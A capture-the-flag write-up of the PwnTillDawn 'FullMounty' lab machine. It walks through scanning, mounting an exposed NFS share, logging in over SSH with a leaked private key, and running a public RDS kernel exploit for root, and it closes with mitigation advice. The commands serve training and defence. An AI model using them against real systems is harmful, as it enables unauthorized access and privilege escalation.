---
title: "PwnTillDawn - fullmounty"
author: Nasrallah
description: ""
date: 2025-04-19 07:00:00 +0000
categories : [PwnTillDawn]
tags: [pwntilldawn, linux, medium, kernel, cve, nfs, ssh]
img_path: /assets/img/pwntilldawn/fullmounty
image:
    path: fullmounty.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

[FullMounty](https://online.pwntilldawn.com/Target/Show/64) from [PwnTillDawn](https://online.pwntilldawn.com/) starts with an NFS share containing ssh keys, we use the private key to gain initial foothold. The kernel used by the system is outdated with a vulnerability in RDS that leads to privilege escalation giving us a root shell.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.150.150.134
Host is up (0.15s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 5.3p1 Debian 3ubuntu7.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 f6:e9:3f:cf:88:ec:7c:35:63:91:34:aa:14:55:49:cc (DSA)
|_  2048 20:1d:e9:90:6f:4b:82:a3:71:1e:a9:99:95:7f:31:ea (RSA)
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      34154/tcp   mountd
|   100005  1,2,3      50354/udp   mountd
|   100021  1,3,4      45783/tcp   nlockmgr
|   100021  1,3,4      48262/udp   nlockmgr
|   100024  1          38840/udp   status
|_  100024  1          40110/tcp   status
2049/tcp open  nfs      2-4 (RPC #100003)
8089/tcp open  ssl/http Splunkd httpd
|_http-server-header: Splunkd
|_http-title: splunkd
| http-robots.txt: 1 disallowed entry 
|_/
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2019-10-28T09:51:59
|_Not valid after:  2022-10-27T09:51:59
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found 4 open ports, 22 running OpenSSH, 111 running rcp, 2049 is an NFS server and 8089 is running splunk on HTTPS.

### NFS

Let's start with NFS and list any available shares.

```terminal
sudo showmount -e 10.150.150.134
Export list for 10.150.150.134:
/srv/exportnfs 10.0.0.0/8
```

We found a `/srv/exportnfs` share, let's mount it.

```terminal
[★]$ sudo mount -t nfs 10.150.150.134:/srv/exportnfs /mnt/ctf -o nolock       
mount.nfs: mount system call failed
```

I got an error when mounting the share. With the help of chatGPT I added the vesion to be used in the command and it worked!

```bash
sudo mount -t nfs 10.150.150.134:/srv/exportnfs /mnt/ctf -o nolock,vers=3
```

Let's list the content of the share.

```terminal
┌──[10.66.66.230]─[sirius💀parrot]-[~/ctf/ptd/full]
└──╼[★]$ ls -la /mnt/ctf
total 32
drwxr-xr-x 5 nobody nogroup 4096 Oct 29  2019 .
drwxr-xr-x 1 root   root       6 Jan 21 11:16 ..
-rw------- 1 nobody nogroup  667 Oct 29  2019 .bash_history
drwxr-xr-x 5 nobody nogroup 4096 Oct 29  2019 .config
-rw-r--r-- 1 sirius docker    41 Oct 22  2019 FLAG49
-rw-r--r-- 1 sirius docker  1675 Oct  3  2019 id_rsa
-rw-r--r-- 1 sirius docker   397 Oct  3  2019 id_rsa.pub
drwxr-xr-x 3 nobody nogroup 4096 Oct 29  2019 .local
drwxr-xr-x 3 nobody nogroup 4096 Oct 29  2019 .mozilla
```

We found an SSH key pair.

I'll copy both to my working directory, give the write permissions to the private key and connect with it.

```terminal
┌──[10.66.66.230]─[sirius💀parrot]-[~/ctf/ptd/full]
└──╼[★]$ cp /mnt/ctf/id_rsa* .
```

Wait, we need a username to connect as? We can simply grab that from the public key.

```terminal
[★]$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAucbPtwj/Ot2rkrMxBSo63gnu8cUE2NboLy226zUjXwdeSLsh9WPfON/atMJCg/uMcvlpo598E/qUsAJq3TTJTYbdMkVSH3ArxUI0gN9rNVeOOs+MBFqfXYhfyLCFv+wtKyYDMeOxTE63hhEdbKVcGLCW8qhp6yORE7CcDnXqcCP5mJHlKdUqC9VBiYzcOzcKqSh6eCpfraKGsXqOcVvHVMgK8TB/JEHxkIZY2nxEl1WC62LKctEx0ZV7KTgJHhpWy1wyiPir4FOSPWUvUZDGv15B3D/M6UCRIguFllFerAacFVPW7SmKdtV3p4+HY3H1clAsWoLJiV1DRiBxoqZgEQ== deadbeef@ubuntu
```

It's `deadbeef`, let's connect.

## **Foothold**

```terminal
[★]$ ssh -i id_rsa deadbeef@10.150.150.134                                    
Unable to negotiate with 10.150.150.134 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
```

I got an error here regarding the key type, I'll add that type of key with `-oHostKeyAlgorithms=+ssh-rsa` and then reconnect.

```terminal
[★]$ ssh deadbeef@10.150.150.134 -i id_rsa -oHostKeyAlgorithms=+ssh-rsa                                                                                                                   
sign_and_send_pubkey: no mutual signature supported                                                                                                                                           
deadbeef@10.150.150.134: Permission denied (publickey).
```

Got another error! We solve that with the option `-oPubkeyAcceptedAlgorithms=+ssh-rsa`.

```terminal
[★]$ ssh deadbeef@10.150.150.134 -i id_rsa -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa
Linux FullMounty 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux
Ubuntu 10.04.4 LTS

Welcome to Ubuntu!
 * Documentation:  https://help.ubuntu.com/
New release 'precise' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Thu Apr 17 09:49:55 2025 from 10.66.66.230
deadbeef@FullMounty:~$ id
uid=1000(deadbeef) gid=1000(deadbeef) groups=4(adm),20(dialout),24(cdrom),46(plugdev),107(lpadmin),108(sambashare),109(admin),1000(deadbeef)
```

## **Privilege Escalation**

Running `uname -a` on the target we find it using a pretty old kernel.

```terminal
deadbeef@FullMounty:~$ uname -a
Linux FullMounty 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux
```

After searching on google for exploits and with some trial and error, we ended up with this [exploit](https://github.com/lucyoa/kernel-exploits/tree/master/rds) that works just fine.

Download the rds precompiled binary and upload it to the target then run it.

```terminal
deadbeef@FullMounty:~$ chmod +x rds 
deadbeef@FullMounty:~$ ./rds 
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved security_ops to 0xc08c8c2c
 [+] Resolved default_security_ops to 0xc0773300
 [+] Resolved cap_ptrace_traceme to 0xc02f3dc0
 [+] Resolved commit_creds to 0xc016dcc0
 [+] Resolved prepare_kernel_cred to 0xc016e000
[*] Overwriting security ops...
[*] Overwriting function pointer...
[*] Triggering payload...
[*] Restoring function pointer...
[*] Got root!
# id
uid=0(root) gid=0(root)
```

We got root!

## **Prevention and Mitigation**

### NFS share

We found an NFS service running on the target, listening on port 2049. The server was exporting the share /srv/exportnfs, which was accessible to any machine within the 10.0.0.0/8 IP range.

This share appeared to contain a user’s home directory, within which we discovered SSH keys. These keys were used to gain unauthorized access to the target system.

#### Recommendations for NFS Configuration

- Never expose sensitive directories such as home directories, which may contains private keys or credentials.

- Create a dedicated directory for NFS sharing, and apply strict content and permission controls

- Limit the access to only trusted hosts/subnets and avoid using broad CIDR ranges like `10.0.0.0/8`

#### Recommendations for SSH Key Handling

- SSH private keys should never be stored on shared or network-accessible locations. They should be kept in the user's local home directory with proper file permissions (chmod 600).

- Use passphrase-protected SSH keys to minimize the risk of unauthorized access if the key is ever leaked.

### Kernel

The kernel version identified on the target system is outdated and contains a known vulnerability in RDS, for which a publicly available exploit exists on the internet. This vulnerability can be leveraged to escalate privileges to root.

- Update the kernel to a newer version that fixes the vulnerability in RDS.
- Establish and maintain a regular patch management schedule to ensure critical security updates are applied in a timely manner, reducing exposure to known exploits.

## **References**

<https://github.com/lucyoa/kernel-exploits/tree/master/rds>

<https://nvd.nist.gov/vuln/detail/cve-2010-3904>

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
